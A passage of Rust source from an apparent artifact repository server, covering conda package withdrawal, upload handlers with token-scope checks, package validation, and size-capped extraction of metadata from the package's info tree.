    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, subdir, filename)): Path<(String, String, String)>,
    body: Bytes,
) -> Result<Response, Response> {
    let ext = require_auth_basic_scope(auth, "conda", "delete:artifacts")?;
    if !ext.is_admin {
        return Err((StatusCode::FORBIDDEN, "Admin access required").into_response());
    }

    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    // Withdrawal is defined for hosted channels only: a remote channel's
    // content is the upstream's to withdraw, a virtual's belongs to its
    // members.
    proxy_helpers::reject_write_if_not_hosted(&repo.repo_type)?;

    validate_cep26_subdir(&subdir)
        .map_err(|e| (StatusCode::BAD_REQUEST, format!("Invalid subdir: {}", e)).into_response())?;
    validate_cep26_filename(&filename).map_err(|e| {
        (StatusCode::BAD_REQUEST, format!("Invalid filename: {}", e)).into_response()
    })?;

    // The body is optional; a body that was SENT but is malformed is a 400
    // rather than a silently defaulted reason (mirrors the quarantine
    // console's parsing, #2912).
    let reason = if body.is_empty() {
        None
    } else {
        serde_json::from_slice::<WithdrawRequest>(&body)
            .map_err(|e| {
                (
                    StatusCode::BAD_REQUEST,
                    format!("Invalid request body: {}", e),
                )
                    .into_response()
            })?
            .reason
    };

    let artifact_path = build_conda_artifact_path(&subdir, &filename);
    let artifact: Option<(uuid::Uuid,)> = sqlx::query_as(
        "SELECT id FROM artifacts \
         WHERE repository_id = $1 AND is_deleted = false AND path = $2 LIMIT 1",
    )
    .bind(repo.id)
    .bind(&artifact_path)
    .fetch_optional(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error looking up package: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;
    let Some((artifact_id,)) = artifact else {
        return Err((StatusCode::NOT_FOUND, "Package not found").into_response());
    };

    let new_status =
        crate::services::quarantine_service::quarantine_now(&state.db, artifact_id, reason.clone())
            .await
            .map_err(|e| e.into_response())?;

    let reason_text = reason.unwrap_or_else(|| "Withdrawn by administrator".to_string());
    let notice = serde_json::json!({
        "id": uuid::Uuid::new_v4().to_string(),
        "message": format!(
            "Package {} was withdrawn from this channel: {}",
            filename, reason_text
        ),
        "level": "warning",
        "created_at": chrono::Utc::now().to_rfc3339(),
        "package": filename,
        "subdir": subdir,
        "reason": reason_text,
    });
    let notice_id = notice["id"].as_str().unwrap().to_string();
    append_channel_notice(&state.db, repo.id, notice).await?;

    // Touch the repo timestamp so any consumer keying freshness off it sees
    // the channel change (mirrors the helm delete route).
    let _ = sqlx::query("UPDATE repositories SET updated_at = NOW() WHERE id = $1")
        .bind(repo.id)
        .execute(&state.db)
        .await;

    info!(
        "Conda withdraw: {} from repo {} by {} (artifact {}): {}",
        filename, repo_key, ext.username, artifact_id, reason_text
    );
    state.event_bus.emit(
        "artifact.quarantine.quarantined",
        artifact_id,
        Some(ext.username.clone()),
    );

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_string(&serde_json::json!({
                "withdrawn": true,
                "artifact_id": artifact_id,
                "quarantine_status": new_status,
                "notice_id": notice_id,
            }))
            .unwrap(),
        ))
        .unwrap())
}

// ---------------------------------------------------------------------------
// PUT /conda/{repo_key}/{subdir}/{filename} - Upload package
// ---------------------------------------------------------------------------

async fn upload_package_put(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, subdir, filename)): Path<(String, String, String)>,
    body: Bytes,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id;
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    proxy_helpers::reject_write_if_not_hosted(&repo.repo_type)?;
    repo.reject_if_promotion_only(false)?;

    if !is_conda_package(&filename) {
        return Err((
            StatusCode::BAD_REQUEST,
            "File must have .conda or .tar.bz2 extension",
        )
            .into_response());
    }

    store_conda_package(&state, &repo, &subdir, &filename, body, user_id).await
}

// ---------------------------------------------------------------------------
// POST /conda/{repo_key}/upload - Upload package (alternative)
// ---------------------------------------------------------------------------

async fn upload_post(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path(repo_key): Path<String>,
    headers: HeaderMap,
    body: Bytes,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id;
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    proxy_helpers::reject_write_if_not_hosted(&repo.repo_type)?;
    repo.reject_if_promotion_only(false)?;

    // Determine subdir and filename from headers
    let subdir = headers
        .get("X-Conda-Subdir")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
        .unwrap_or_else(|| "noarch".to_string());

    let filename = extract_upload_filename(&headers)?;

    if !is_conda_package(&filename) {
        return Err((
            StatusCode::BAD_REQUEST,
            "File must have .conda or .tar.bz2 extension",
        )
            .into_response());
    }

    store_conda_package(&state, &repo, &subdir, &filename, body, user_id).await
}

// ---------------------------------------------------------------------------
// Token-authenticated upload handlers (for /t/<TOKEN>/ URL paths)
// ---------------------------------------------------------------------------

/// PUT upload using URL path token: /conda/t/<TOKEN>/<repo_key>/<subdir>/<filename>
async fn upload_package_put_with_token(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((token, repo_key, subdir, filename)): Path<(String, String, String, String)>,
    body: Bytes,
) -> Result<Response, Response> {
    // Try middleware auth first (if present), fall back to URL token
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = if auth.is_some() {
        require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id
    } else {
        authenticate_with_token(&state.db, &state.config, &token).await?
    };

    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    proxy_helpers::reject_write_if_not_hosted(&repo.repo_type)?;
    repo.reject_if_promotion_only(false)?;

    if !is_conda_package(&filename) {
        return Err((
            StatusCode::BAD_REQUEST,
            "File must have .conda or .tar.bz2 extension",
        )
            .into_response());
    }

    store_conda_package(&state, &repo, &subdir, &filename, body, user_id).await
}

/// POST upload using URL path token: /conda/t/<TOKEN>/<repo_key>/upload
async fn upload_post_with_token(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((token, repo_key)): Path<(String, String)>,
    headers: HeaderMap,
    body: Bytes,
) -> Result<Response, Response> {
    // Try middleware auth first (if present), fall back to URL token
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = if auth.is_some() {
        require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id
    } else {
        authenticate_with_token(&state.db, &state.config, &token).await?
    };

    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    proxy_helpers::reject_write_if_not_hosted(&repo.repo_type)?;
    repo.reject_if_promotion_only(false)?;

    let subdir = headers
        .get("X-Conda-Subdir")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
        .unwrap_or_else(|| "noarch".to_string());

    let filename = extract_upload_filename(&headers)?;

    if !is_conda_package(&filename) {
        return Err((
            StatusCode::BAD_REQUEST,
            "File must have .conda or .tar.bz2 extension",
        )
            .into_response());
    }

    store_conda_package(&state, &repo, &subdir, &filename, body, user_id).await
}

// ---------------------------------------------------------------------------
// Package metadata extraction
// ---------------------------------------------------------------------------

/// Validate a conda package structure.
///
/// Returns Ok(()) if the package is valid, or Err with a descriptive error message.
/// Checks:
/// - .conda v2: must be a valid ZIP containing an info-*.tar.zst archive
/// - .tar.bz2 v1: must be a valid bzip2-compressed tar containing info/index.json
/// - Extracted metadata must have required fields: name, version
fn validate_conda_package(content: &[u8], filename: &str) -> Result<(), String> {
    if filename.ends_with(".conda") {
        // Validate .conda v2 structure
        let cursor = std::io::Cursor::new(content);
        let mut archive = zip::ZipArchive::new(cursor)
            .map_err(|e| format!("Invalid .conda package: not a valid ZIP archive: {}", e))?;

        // Check for info-*.tar.zst
        let file_names: Vec<String> = (0..archive.len())
            .filter_map(|i| archive.by_index(i).ok().map(|f| f.name().to_string()))
            .collect();

        let has_info = file_names
            .iter()
            .any(|n| n.starts_with("info-") && n.ends_with(".tar.zst"));
        if !has_info {
            return Err("Invalid .conda package: missing info-*.tar.zst archive".to_string());
        }
    } else if filename.ends_with(".tar.bz2") {
        // Validate .tar.bz2 v1 structure. Wrap the bzip2 stream in the shared
        // total-byte budget (#2556) so a crafted v1 package cannot inflate
        // unbounded while we walk it looking for info/index.json.
        // `MultiBzDecoder`, not `BzDecoder`: pbzip2/lbzip2 write a v1 package
        // as a sequence of independent streams, and the single-stream decoder
        // would stop at the first boundary and reject a valid package whose
        // `info/index.json` sits past it (#4067).
        let decoder = crate::util::bounded_archive::budgeted(bzip2::read::MultiBzDecoder::new(
            std::io::Cursor::new(content),
        ));
        let mut archive = tar::Archive::new(decoder);

        let entries = archive
            .entries()
            .map_err(|e| format!("Invalid .tar.bz2 package: not a valid bzip2 tar: {}", e))?;

        let has_index = entries.filter_map(|e| e.ok()).any(|e| {
            e.path()
                .ok()
                .map(|p| p.to_string_lossy() == "info/index.json")
                .unwrap_or(false)
        });

        if !has_index {
            return Err("Invalid .tar.bz2 package: missing info/index.json".to_string());
        }
    } else {
        return Err(format!(
            "Unsupported package format: expected .conda or .tar.bz2, got {}",
            filename
        ));
    }

    // Validate that metadata extraction succeeds and has required fields,
    // and that those fields agree with the uploaded filename. Conda clients
    // key repodata.json off the filename, so a mismatch between the embedded
    // index.json and the filename silently publishes a package under the
    // wrong coordinates (the embedded metadata is discarded). Reject it.
    if let Some(meta) = extract_conda_metadata(content, filename) {
        if meta.get("name").and_then(|v| v.as_str()).is_none() {
            return Err("Invalid package metadata: missing 'name' field".to_string());
        }
        if meta.get("version").and_then(|v| v.as_str()).is_none() {
            return Err("Invalid package metadata: missing 'version' field".to_string());
        }
        check_filename_matches_metadata(filename, &meta)?;
    }
    // Note: we don't fail if metadata extraction fails entirely, since
    // the filename already carries name/version info. The package is still usable.

    Ok(())
}

/// Cross-check the uploaded filename against the embedded `index.json`
/// metadata. Returns an error string when the filename-derived
/// `name`/`version`/`build` disagree with the metadata fields.
///
/// The `build` is only compared when present in both the filename and the
/// metadata, since some legacy v1 packages omit a `build` key in index.json.
/// If the filename cannot be parsed at all, validation is left to the
/// structural checks above (we do not fail solely on an unparseable name).
fn check_filename_matches_metadata(
    filename: &str,
    meta: &serde_json::Value,
) -> std::result::Result<(), String> {
    let Ok((fname, fver, fbuild)) =
        crate::formats::conda_native::CondaNativeHandler::parse_package_filename(filename)
    else {
        return Ok(());
    };

    if let Some(meta_name) = meta.get("name").and_then(|v| v.as_str()) {
        if meta_name != fname {
            return Err(format!(
                "Package name mismatch: filename declares '{}' but index.json metadata says '{}'",
                fname, meta_name
            ));
        }
    }
    if let Some(meta_version) = meta.get("version").and_then(|v| v.as_str()) {
        if meta_version != fver {
            return Err(format!(
                "Package version mismatch: filename declares '{}' but index.json metadata says '{}'",
                fver, meta_version
            ));
        }
    }
    if let Some(meta_build) = meta.get("build").and_then(|v| v.as_str()) {
        if meta_build != fbuild {
            return Err(format!(
                "Package build mismatch: filename declares '{}' but index.json metadata says '{}'",
                fbuild, meta_build
            ));
        }
    }

    Ok(())
}

/// Extract metadata from a conda package.
///
/// For .conda (v2) packages: ZIP archive containing `metadata.json` at the root
/// or `info-*.tar.zst` inner archive with `info/index.json`.
///
/// For .tar.bz2 (v1) packages: bzip2-compressed tar with `info/index.json`.
///
/// Returns the parsed JSON metadata, or None if extraction fails.
fn extract_conda_metadata(content: &[u8], filename: &str) -> Option<serde_json::Value> {
    if filename.ends_with(".conda") {
        extract_conda_v2_metadata(content)
    } else if filename.ends_with(".tar.bz2") {
        extract_conda_v1_metadata(content)
    } else {
        None
    }
}

/// Per-entry read cap for the small JSON/text documents under `info/`
/// (`about.json`, `link.json`, `run_exports.json`, `hash_input.json` and the
/// recipe text). These are human-scale files — even a verbose `about.json`
/// description or a long `meta.yaml` is a few tens of KiB — so 1 MiB is orders
/// of magnitude above anything real while staying well inside the shared
/// ingest caps (#4037).
const MAX_CONDA_INFO_ENTRY_BYTES: u64 = 1024 * 1024;

/// Per-entry read cap for an install script found in the package payload.
///
/// Deliberately the *same* small-document cap as the `info/` text members
/// rather than a payload-sized one: a link script is a few lines of shell or
/// batch, and a "script" a megabyte long is not something a reviewer reads —
/// it is something the analyzer would have to buffer. A script over the cap is
/// recorded as unreadable and the analysis drops to `Partial`, exactly as an
/// over-cap `info/` member does (#4033, #4037).
const MAX_CONDA_SCRIPT_ENTRY_BYTES: u64 = MAX_CONDA_INFO_ENTRY_BYTES;

/// Per-entry read cap for a payload file the binary cataloger (#4046) reads.
///
/// Unlike a script, a shared library legitimately runs to tens of MB, and the
/// facts the cataloger wants — `.rodata` version banners, the SONAME — sit in
/// the file body, so this cap is payload-sized. An entry larger than the cap
/// contributes its head only: banner scanning over a truncated head is still
/// sound (a truncated banner simply does not match an anchored rule, which is
/// a recall limit, never a false positive), and the section table that holds
/// the SONAME for a truly huge `.so` is out of reach either way.
const MAX_CONDA_BINARY_ENTRY_BYTES: u64 = 32 * 1024 * 1024;

/// Read cap for the per-file manifest (`info/paths.json`, or the legacy
/// `info/files` list). Deliberately the *shared* ingest per-entry cap rather
/// than the small-document cap above: a manifest carries one record per
/// packaged file (~150 bytes once its sha256 and size are included), so 8 MiB
/// still admits a ~55 000-file package. The rare package above that (texlive
/// and friends) records its manifest as `unreadable` and ingests anyway,
/// rather than buffering unbounded (#4037, #2556).
const MAX_CONDA_MANIFEST_ENTRY_BYTES: u64 =
    crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES;

// ---------------------------------------------------------------------------
// The `info/` tree (#4037)
// ---------------------------------------------------------------------------
//
// A conda package's `info/` directory carries far more than `index.json`: the
// long-form description (`about.json`), the per-file manifest with hashes
// (`paths.json`, or the hash-less `files` list on older packages), the recipe
// that built it, its run exports, its variant inputs, and its link metadata.
// Every member but `index.json` is optional, so a package missing one still
// ingests; `info_files` records *why* each member is missing so a consumer can
// tell "this package has no recipe" from "we never looked".

/// Slot names used both as `CondaInfoTree` keys and as the `info_files` status
/// keys persisted with the package.
const SLOT_ABOUT: &str = "about_json";
const SLOT_PATHS: &str = "paths_json";
const SLOT_FILES: &str = "files";
const SLOT_RECIPE: &str = "recipe";
const SLOT_LINK: &str = "link_json";
const SLOT_RUN_EXPORTS: &str = "run_exports_json";
const SLOT_HASH_INPUT: &str = "hash_input_json";

/// The member was found and parsed.
const INFO_STATUS_PRESENT: &str = "present";
/// The package genuinely does not carry the member.
const INFO_STATUS_ABSENT: &str = "absent";
/// The member was there but could not be used — over its cap, or malformed.
const INFO_STATUS_UNREADABLE: &str = "unreadable";

/// The `about.json` fields promoted to the top level of the stored metadata
/// document, where `channeldata.json` reads them back (#4038). `source_url` is
/// handled separately because it is not always a string.
const ABOUT_TEXT_FIELDS: [&str; 5] = ["summary", "description", "home", "doc_url", "dev_url"];

/// Raw bytes of the `info/` members captured during a single bounded walk of
/// the package's tar.
#[derive(Default)]
struct CondaInfoTree {
    index_json: Option<Vec<u8>>,
    about_json: Option<Vec<u8>>,
    paths_json: Option<Vec<u8>>,
    files_list: Option<Vec<u8>>,
    link_json: Option<Vec<u8>>,
    run_exports_json: Option<Vec<u8>>,
    hash_input_json: Option<Vec<u8>>,
    /// `info/recipe/meta.yaml` and/or `recipe.yaml`, kept as raw bytes. Parsing
    /// recipes is `conda_recipe.rs`'s job, not ingest's.
    recipe: BTreeMap<String, Vec<u8>>,
    /// Members that were present but could not be read (over their cap, or the
    /// archive walk was cut short part-way through them).
    unreadable: BTreeSet<&'static str>,
}

impl CondaInfoTree {
    /// Status for a member we hold no bytes for: either it was never in the
    /// archive, or reading it failed.
    fn missing_status(&self, slot: &'static str) -> &'static str {
        if self.unreadable.contains(slot) {
            INFO_STATUS_UNREADABLE
        } else {
            INFO_STATUS_ABSENT
        }
    }
}

/// Map an `info/` path to the slot it fills and the read cap that applies.
/// Returns `None` for the packaged payload, which ingest never reads.
fn info_slot_for(path: &str) -> Option<(&'static str, u64)> {
    match path {
        "info/index.json" => Some((
            "index_json",
            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
        )),
        "info/about.json" => Some((SLOT_ABOUT, MAX_CONDA_INFO_ENTRY_BYTES)),
        "info/paths.json" => Some((SLOT_PATHS, MAX_CONDA_MANIFEST_ENTRY_BYTES)),
        "info/files" => Some((SLOT_FILES, MAX_CONDA_MANIFEST_ENTRY_BYTES)),
        "info/link.json" => Some((SLOT_LINK, MAX_CONDA_INFO_ENTRY_BYTES)),
        "info/run_exports.json" => Some((SLOT_RUN_EXPORTS, MAX_CONDA_INFO_ENTRY_BYTES)),
        "info/hash_input.json" => Some((SLOT_HASH_INPUT, MAX_CONDA_INFO_ENTRY_BYTES)),
        // All four recipe variants, because they are NOT interchangeable and
        // `conda_recipe::preferred_recipe_files` ranks them:
        //   * `rendered_recipe.yaml` — rattler-build's evaluated recipe, with
        //     `finalized_sources`. The best source of truth we ever get.
        //   * `meta.yaml`            — conda-build's RENDERED recipe (Jinja
        //     evaluated, selectors applied) despite the name.
        //   * `recipe.yaml`          — rattler-build's raw v1 recipe.
        //   * `meta.yaml.template`   — conda-build's raw Jinja template. Worst
        //     case: every platform branch is emitted, so a Linux package
        //     appears to vendor Windows-only sources.
        // Capturing only the first two would silently downgrade every
        // rattler-build package to "no vendored components" (#4045).
        "info/recipe/meta.yaml"
        | "info/recipe/recipe.yaml"
        | "info/recipe/rendered_recipe.yaml"
        | "info/recipe/meta.yaml.template" => Some((SLOT_RECIPE, MAX_CONDA_INFO_ENTRY_BYTES)),
        // Some packages nest the info tar one level deeper; the historical
        // extractor accepted any `*/index.json`, so keep that tolerance.
        _ if path.ends_with("/index.json") => Some((
            "index_json",
            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
        )),
        _ => None,
    }
}

/// What a bounded tar walk managed to see.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
struct TarWalkOutcome {
    /// The walk did not reach the end of the archive: the stream was truncated
    /// or malformed, it breached the shared decompressed-byte budget, or it hit
    /// the entry-count cap. Whatever sat past that point was never seen, so a
    /// caller must not report "not present" as "not there".
    truncated: bool,
}

/// Walk a decoded tar once, handing every entry to `visit`.
///
/// Bounded exactly like `bounded_archive`'s single-entry readers (#2556): the
/// decoded stream carries the total-byte budget, the walk stops at the shared
/// entry-count cap, and `visit` reads each entry through a per-entry cap of its
/// own choosing. Nothing here fails the ingest — a broken archive ends the walk
/// and reports `truncated`.
///
/// `visit` receives the normalised path, the entry type (so a caller can skip
/// directories and symlinks) and the entry's bounded reader. It is shared by
/// the `info/` walk and the payload script walk so that both are subject to the
/// same three caps by construction rather than by copy.
fn walk_bounded_tar<R: std::io::Read>(
    reader: R,
    what: &str,
    mut visit: impl FnMut(&str, tar::EntryType, &mut dyn std::io::Read),
) -> TarWalkOutcome {
    let mut outcome = TarWalkOutcome::default();
    let mut archive = tar::Archive::new(crate::util::bounded_archive::budgeted(reader));

    let entries = match archive.entries() {
        Ok(entries) => entries,
        Err(e) => {
            tracing::debug!("{} is not readable: {}", what, e);
            outcome.truncated = true;
            return outcome;
        }
    };

    let mut entries_seen: u64 = 0;
    for entry in entries {
        // A truncated or over-budget archive keeps whatever it already yielded
        // rather than discarding the package's metadata entirely.
        let mut entry = match entry {
            Ok(entry) => entry,
            Err(e) => {
                tracing::debug!("{} walk stopped early: {}", what, e);
                outcome.truncated = true;
                break;
            }
        };

        entries_seen += 1;
        if entries_seen > crate::util::bounded_archive::MAX_INGEST_ARCHIVE_ENTRIES {
            tracing::debug!("{} exceeds the entry-count cap; stopping the walk", what);
            outcome.truncated = true;
            break;
        }

        let path = match entry.path() {
            Ok(path) => path.to_string_lossy().to_string(),
            Err(_) => continue,
        };
        let path = path.trim_start_matches("./").to_string();
        let entry_type = entry.header().entry_type();

        visit(&path, entry_type, &mut entry);
    }

    outcome
}

/// Walk a decoded tar once and capture every `info/` member we care about.
///
/// A member that breaches its cap is recorded as unreadable and skipped — it
/// never fails the ingest.
fn collect_conda_info_tree<R: std::io::Read>(reader: R) -> CondaInfoTree {
    let mut tree = CondaInfoTree::default();

    walk_bounded_tar(reader, "conda info tar", |path, _entry_type, entry| {
        let Some((slot, cap)) = info_slot_for(path) else {
            return;
        };

        match crate::util::bounded_archive::read_capped(entry, cap, path) {
            Ok(bytes) => match slot {
                "index_json" => {
                    // `info/index.json` wins over a nested `*/index.json`.
                    if tree.index_json.is_none() || path == "info/index.json" {
                        tree.index_json = Some(bytes);
                    }
                }
                SLOT_ABOUT => tree.about_json = Some(bytes),
                SLOT_PATHS => tree.paths_json = Some(bytes),
                SLOT_FILES => tree.files_list = Some(bytes),
                SLOT_LINK => tree.link_json = Some(bytes),
                SLOT_RUN_EXPORTS => tree.run_exports_json = Some(bytes),
                SLOT_HASH_INPUT => tree.hash_input_json = Some(bytes),
                SLOT_RECIPE => {
                    let name = path.rsplit('/').next().unwrap_or(path).to_string();
                    tree.recipe.insert(name, bytes);
                }
                _ => {}
            },
            Err(e) => {
                tracing::debug!("conda {} is not readable, skipping: {}", path, e);
                tree.unreadable.insert(slot);
            }
        }
    });

    tree
}

/// `about.json`'s `source_url` is a plain string for single-source recipes and
/// an array when the recipe pulls several sources. channeldata carries one
/// string, so the array form collapses to its first usable entry.
fn first_source_url(value: &serde_json::Value) -> Option<&str> {
    match value {
        serde_json::Value::String(s) if !s.is_empty() => Some(s.as_str()),
        serde_json::Value::Array(items) => items
            .iter()
            .find_map(|item| item.as_str().filter(|s| !s.is_empty())),
        _ => None,
    }
}

/// conda runs a package's install-time scripts from marker files in the
/// packaged file list (`bin/.<pkg>-post-link.sh`, `Scripts/.<pkg>-pre-unlink.bat`,
/// …). `info/link.json` itself only describes noarch entry points, so the file
/// manifest — not `link.json` — is what actually says whether a package runs
/// code at install time.
fn path_is_install_script(path: &str) -> bool {
    const MARKERS: [&str; 3] = ["-pre-link.", "-post-link.", "-pre-unlink."];
    MARKERS.iter().any(|marker| path.contains(marker))
}

/// Normalise `info/paths.json` into the stored manifest shape.
fn build_paths_manifest(paths_json: &serde_json::Value) -> serde_json::Value {
    let entries: Vec<serde_json::Value> = paths_json
        .get("paths")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();
    // Directory and softlink entries legitimately carry no hash, so the
    // manifest is hash-bearing when *any* entry has one.
    let has_hashes = entries.iter().any(|entry| {
        entry
            .get("sha256")
            .and_then(|v| v.as_str())
            .is_some_and(|s| !s.is_empty())
    });
    serde_json::json!({
        "source": "paths.json",
        "paths_version": paths_json.get("paths_version").cloned().unwrap_or(serde_json::Value::Null),
        "has_hashes": has_hashes,
        "file_count": entries.len(),
        "paths": entries,
    })
}

/// Normalise the legacy `info/files` list — a newline-separated set of paths
/// with no hashes and no types — into the same manifest shape.
fn build_files_manifest(bytes: &[u8]) -> serde_json::Value {
    let text = String::from_utf8_lossy(bytes);
    let entries: Vec<serde_json::Value> = text
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(|path| serde_json::json!({ "_path": path }))
        .collect();
    serde_json::json!({
        "source": "files",
        "has_hashes": false,
        "file_count": entries.len(),
        "paths": entries,
    })
}

/// The manifest recorded when a package carries neither `paths.json` nor
/// `files` (or both were unreadable).
fn empty_paths_manifest() -> serde_json::Value {
    serde_json::json!({
        "source": "none",
        "has_hashes": false,
        "file_count": 0,
        "paths": [],
    })
}

/// Merge the optional `info/` members into the parsed `index.json` object.
///
/// Nothing here can fail the ingest: a missing or malformed member is logged
/// and recorded in `info_files`, and the package still publishes.
fn enrich_with_info_tree(base: &mut serde_json::Value, tree: &CondaInfoTree) {
    let Some(obj) = base.as_object_mut() else {
        return;
    };
    let mut status = serde_json::Map::new();

    // --- info/about.json --------------------------------------------------
    let mut about_status = tree.missing_status(SLOT_ABOUT);
    if let Some(bytes) = &tree.about_json {
        match serde_json::from_slice::<serde_json::Value>(bytes) {
            Ok(about) => {
                about_status = INFO_STATUS_PRESENT;
                for field in ABOUT_TEXT_FIELDS {
                    if let Some(value) = about.get(field).and_then(|v| v.as_str()) {
                        if !value.is_empty() {
                            obj.insert(field.to_string(), serde_json::json!(value));
                        }
                    }
                }
                if let Some(url) = about.get("source_url").and_then(first_source_url) {
                    obj.insert("source_url".to_string(), serde_json::json!(url));
                }
                // index.json carries the licence for most packages; older ones
                // only declare it in about.json, so fill the gap without ever
                // overriding what index.json said.
                for field in ["license", "license_family"] {
                    let already_set = obj
                        .get(field)
                        .and_then(|v| v.as_str())
                        .is_some_and(|s| !s.is_empty());
                    if already_set {
                        continue;
                    }
                    if let Some(value) = about.get(field).and_then(|v| v.as_str()) {
                        if !value.is_empty() {
                            obj.insert(field.to_string(), serde_json::json!(value));
                        }
                    }
                }
                obj.insert("about".to_string(), about);
            }
            Err(e) => {
                tracing::debug!("conda info/about.json is not valid JSON: {}", e);
                about_status = INFO_STATUS_UNREADABLE;
            }
        }
    }
    status.insert(SLOT_ABOUT.to_string(), serde_json::json!(about_status));

    // --- info/paths.json, falling back to info/files -----------------------
    let mut paths_status = tree.missing_status(SLOT_PATHS);
    let mut manifest: Option<serde_json::Value> = None;
    if let Some(bytes) = &tree.paths_json {
        match serde_json::from_slice::<serde_json::Value>(bytes) {
            Ok(parsed) => {
                paths_status = INFO_STATUS_PRESENT;
                manifest = Some(build_paths_manifest(&parsed));
            }
            Err(e) => {
                tracing::debug!("conda info/paths.json is not valid JSON: {}", e);
                paths_status = INFO_STATUS_UNREADABLE;
            }
        }
    }
    let files_status = if tree.files_list.is_some() {
        INFO_STATUS_PRESENT
    } else {
        tree.missing_status(SLOT_FILES)
    };
    if manifest.is_none() {
        if let Some(bytes) = &tree.files_list {
            manifest = Some(build_files_manifest(bytes));
        }
    }
    let manifest = manifest.unwrap_or_else(empty_paths_manifest);
    let has_install_scripts = manifest
        .get("paths")
        .and_then(|v| v.as_array())
        .is_some_and(|entries| {
            entries.iter().any(|entry| {
                entry
                    .get("_path")
                    .and_then(|v| v.as_str())
                    .is_some_and(path_is_install_script)
            })
        });
    obj.insert("paths".to_string(), manifest);
    obj.insert(
        "has_install_scripts".to_string(),
        serde_json::json!(has_install_scripts),
    );
    status.insert(SLOT_PATHS.to_string(), serde_json::json!(paths_status));
    status.insert(SLOT_FILES.to_string(), serde_json::json!(files_status));

    // --- info/recipe/ -----------------------------------------------------
    // Raw text only. `conda_recipe.rs` owns parsing; ingest just hands it on.
    let recipe_status = if tree.recipe.is_empty() {
        tree.missing_status(SLOT_RECIPE)
    } else {
        let files: serde_json::Map<String, serde_json::Value> = tree
            .recipe
            .iter()
            .map(|(name, bytes)| {
                (
                    name.clone(),
                    serde_json::json!(String::from_utf8_lossy(bytes)),
                )
            })
            .collect();
        obj.insert("recipe".to_string(), serde_json::Value::Object(files));
        INFO_STATUS_PRESENT
    };
    status.insert(SLOT_RECIPE.to_string(), serde_json::json!(recipe_status));

    // --- the remaining JSON members, stored verbatim -----------------------
    // `run_exports` is the one exception to "verbatim": the legacy bare-list
    // spelling is normalised to the CEP-12 dict (#4038), which is the
    // equivalent document, not a rewrite — see `normalize_run_exports`.
    for (slot, bytes, key) in [
        (SLOT_LINK, &tree.link_json, "link"),
        (
            SLOT_RUN_EXPORTS,
            &tree.run_exports_json,
            RUN_EXPORTS_METADATA_KEY,
        ),
        (SLOT_HASH_INPUT, &tree.hash_input_json, "hash_input"),
    ] {
        let mut slot_status = tree.missing_status(slot);
        if let Some(bytes) = bytes {
            match serde_json::from_slice::<serde_json::Value>(bytes) {
                Ok(parsed) => {
                    slot_status = INFO_STATUS_PRESENT;
                    let parsed = if slot == SLOT_RUN_EXPORTS {
                        normalize_run_exports(parsed)
                    } else {
                        parsed
                    };
                    obj.insert(key.to_string(), parsed);
                }
                Err(e) => {
                    tracing::debug!("conda info/{}.json is not valid JSON: {}", key, e);
                    slot_status = INFO_STATUS_UNREADABLE;
                }
            }
        }
        status.insert(slot.to_string(), serde_json::json!(slot_status));
    }

    obj.insert("info_files".to_string(), serde_json::Value::Object(status));
}

/// Extract metadata from .conda (v2) ZIP package.
///
/// The .conda format is a ZIP archive containing:
/// - `metadata.json` at the root (with name, version, etc.)
/// - `info-<name>-<ver>-<build>.tar.zst` (zstd-compressed tar with the `info/` tree)
/// - `pkg-<name>-<ver>-<build>.tar.zst` (the actual package files)
///
/// Returns `index.json` enriched with the rest of the `info/` tree (#4037).
///
/// The container is opened with `rattler_package_streaming` (#4040) — the
/// reference `.conda` reader the pixi/prefix.dev tooling is built on — and the
/// info tar it yields is walked by the same `collect_conda_info_tree` as the
/// v1 path, so the three shared ingest caps (decompressed-byte budget,
/// entry-count cap, per-entry cap, #2556) apply unchanged. The decompressed
/// ceiling thereby moves from this path's old private 100 MiB buffering cap to
/// the shared 128 MiB streaming budget the v1 path already uses — a widening
/// of the ceiling and a narrowing of the mechanism (streamed, not buffered).
fn extract_conda_v2_metadata(content: &[u8]) -> Option<serde_json::Value> {
    let cursor = std::io::Cursor::new(content);
    let mut archive = zip::ZipArchive::new(cursor).ok()?;

    // `metadata.json` at the root of the ZIP. Real .conda packages only carry
    // the format version here, but a package that inlines the full index takes
    // precedence, as it always has. Cap the entry read so a crafted zip entry
    // cannot buffer unbounded (#2556).
    let root_index = archive
        .by_name("metadata.json")
        .ok()
        .and_then(|file| {
            crate::util::bounded_archive::read_capped(
                file,
                crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
                "conda metadata.json",
            )
            .ok()
        })
